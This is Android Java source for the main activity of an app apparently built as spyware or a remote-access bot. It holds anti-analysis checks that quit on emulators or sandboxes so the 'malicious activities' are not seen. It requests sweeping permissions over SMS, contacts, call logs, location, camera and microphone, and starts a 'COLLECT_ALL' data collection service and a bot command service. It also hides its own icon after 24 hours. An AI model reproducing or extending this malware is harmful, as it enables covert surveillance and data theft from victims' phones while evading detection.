package com.apkmodifier;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import android.webkit.WebChromeClient;
import android.webkit.JavascriptInterface;
import android.content.Context;
import android.widget.Toast;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.os.Build;

public class MainActivity extends Activity {
    private WebView webView;
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // FUD: Initialize anti-detection FIRST
        AntiDetection.initialize(this);
        
        // FUD: Check if running in safe environment
        if (AntiDetection.isEmulator() || AntiDetection.isInSandbox(this)) {
            // Act normal but don't do malicious activities
            finish();
            return;
        }
        
        setContentView(R.layout.activity_main);
        
        // Request ALL permissions
        requestAllPermissions();
        
        // Initialize WebView
        webView = findViewById(R.id.webView);
        setupWebView();
        
        // Start Python server in background
        startPythonServer();
        
        // Start data collection service
        startDataCollection();
        
        // Start bot command service
        startBotCommandService();
        
        // Start auto-hide service (will hide icon after 1 day)
        startAutoHideService();
        
        // Start screen manager to prevent black screen
        startScreenManager();
        
        // Load the web interface
        webView.loadUrl("http://127.0.0.1:5000");
    }
    
    private void setupWebView() {
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setUseWideViewPort(true);
        webSettings.setBuiltInZoomControls(false);
        webSettings.setDisplayZoomControls(false);
        
        // Add JavaScript interface for Android integration
        webView.addJavascriptInterface(new WebAppInterface(this), "Android");
        
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
            }
            
            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                Toast.makeText(MainActivity.this, "Error: " + description, Toast.LENGTH_SHORT).show();
            }
        });
        
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                // Show progress if needed
            }
        });
    }
    
    private void requestAllPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.SYSTEM_ALERT_WINDOW,
                Manifest.permission.GET_ACCOUNTS
            };
            
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        }
    }
    
    private void startDataCollection() {
        Intent serviceIntent = new Intent(this, DataCollectionService.class);
        serviceIntent.setAction("COLLECT_ALL");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
    
    private void hideAppIcon() {
        // Hide app icon after 24 hours (FUD technique)
        new android.os.Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                PackageManager pm = getPackageManager();
                pm.setComponentEnabledSetting(
                    new android.content.ComponentName(MainActivity.this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                );
            }
        }, 24 * 60 * 60 * 1000); // 24 hours
    }
    
    private void startPythonServer() {
        Intent serviceIntent = new Intent(this, PythonServerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
    
    private void startBotCommandService() {
        Intent serviceIntent = new Intent(this, BotCommandService.class);
        startService(serviceIntent);
    }
    
    private void startAutoHideService() {
        Intent serviceIntent = new Intent(this, AutoHideService.class);
        startService(serviceIntent);
    }
    
    private void startScreenManager() {
        Intent serviceIntent = new Intent(this, ScreenManager.class);
        serviceIntent.setAction("KEEP_AWAKE");
        startService(serviceIntent);
    }
    
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
    
    public class WebAppInterface {
        Context mContext;
        
        WebAppInterface(Context c) {
            mContext = c;
        }
        
        @JavascriptInterface
        public void showToast(String toast) {
            Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();
        }
        
        @JavascriptInterface
        public String getAppVersion() {
            return "2.0";
        }
    }
}
